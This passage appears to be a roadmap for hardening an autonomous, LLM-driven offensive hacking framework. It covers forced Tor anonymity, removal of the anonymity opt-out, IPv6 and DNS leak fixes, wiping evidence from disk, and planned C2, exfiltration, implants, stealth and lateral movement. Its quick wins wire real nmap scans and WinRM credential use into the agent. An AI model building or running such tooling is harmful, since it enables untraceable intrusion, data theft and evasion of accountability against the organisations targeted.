These are prompt decoration for the LLM, not operational code. Strip them to ~300 lines of real enforcement:

| Keep (~300 lines) | Remove (~750 lines) |
|--------------------|--------------------|
| Tor connectivity check | Traffic analysis descriptions |
| DNS leak detection (via Tor) | Browser fingerprinting theory |
| IPv6 check | Network architecture essays |
| SOCKS5 routing | Tor design documentation |
| Credential management | Log analysis techniques |
| `check()` orchestrator | All `_simulate_*` methods |

### Files to modify:
- `orchestrator/proxy_guard.py` — strip theater, harden enforcement, standardize env vars
- `orchestrator/brain/anonymity_guard.py` — remove `allow_skip` passthrough
- `orchestrator/brain/api.py` — remove `no_anonymity` from `StartRequest`
- `orchestrator/app.py` — remove `--no-anonymity` CLI flag
- `orchestrator/modes/autonomous.py` — remove `no_anonymity` parameter
- `docker-compose.yml` — add `sysctls: net.ipv6.conf.all.disable_ipv6=1` to all services
- Each Dockerfile — add ip6tables rules or container-level kill switch
- `.env.example` — `TOR_PASSWORD` → `TOR_CONTROL_PASS`

---

## P8 — Security Hardening Before Real Use

Do NOT run this against real targets without:

- [ ] **All hardcoded credentials removed** (already fixed: sudo password, JWT_SECRET)
- [ ] **API key rotation** — the .env has what appear to be real NVIDIA/Ollama keys. Rotate before any operational use.
- [ ] **Tor enforcement cannot be bypassed** — `--no-anonymity` is removed (P7a)
- [ ] **IPv6 isolation** — `sysctl disable_ipv6=1` in Dockerfiles + ip6tables DROP (P7c)
- [ ] **No DNS leaks** — `socks5h://` everywhere, no direct socket.create_connection (P7b)
- [ ] **Audit trail hardened** — current audit log is a JSONL file. Make it append-only via Docker volume permissions or ship to external syslog
- [ ] **No evidence on disk** — `brain.db`, `recon_log`, `audit/` all persist on Docker volumes. Add encryption-at-rest or shutdown wipe
- [ ] **Container-level egress lockdown** — iptables DROP in each container, only Tor proxy allowed (P7e)

---

## Implementation Order

| Phase | Items | Effort |
|-------|-------|--------|
| **1. Foundation** | P0 (phase executors), P4 (finding types), P3 (fix LLM loop in api.py) | 3-5 days |
| **2. Proxy** | P7 (anonymity killswitches, DNS, IPv6, Tor control, container lockdown) | 2-3 days |
| **3. Containers** | P1 (Dockerfiles install tools), P2 (fix post-ex wrappers) | 2-3 days |
| **4. C2 + Agent** | P5 (C2 protocol + crypto + exfil), P6 (implant + stealth + lateral) | 5-7 days |
| **5. Validation** | P9 (test-range, kill chain test, CI, metrics) | 3-4 days |
| **6. Hardening** | P8 (security checklist), P10 (brain DB maintenance) | 1-2 days |
| **Total** | | **~4 weeks** |

---

## Quick Wins (do these first, <2 hours each)

1. **`orchestrator/brain/api.py`: change the recon phase** to call `nmap_scanner.scan(target)` instead of `call_model()` — immediately switches from "LLM writes about ports" to "real port scan feeds next phase"

2. **`recon-pipeline/Dockerfile`: add `apt install -y whatweb subfinder`** — 1 line, immediately makes tech detection work in containers

3. **`orchestrator/postex/winrm_exploit.py`: wire credential flow** — it already has pywinrm, just needs credentials from the brain's finding store

4. **`.env.example: fix `TOR_PASSWORD` → `TOR_CONTROL_PASS`** — 1 line, fixes Tor control connection for anyone following the setup guide

5. **`docker-compose.yml`: add `sysctls: net.ipv6.conf.all.disable_ipv6=1` to all services** — 1 line per service, plugs IPv6 leak

6. **`orchestrator/proxy_guard.py`: delete the `if self._no_anonymity: return` bypass** — 2 lines, removes the biggest OpSec hole

7. **Run `VACUUM` on `orchestrator/data/brain.db`** — reclaims ~75MB from 71K free pages, prevents perf degradation
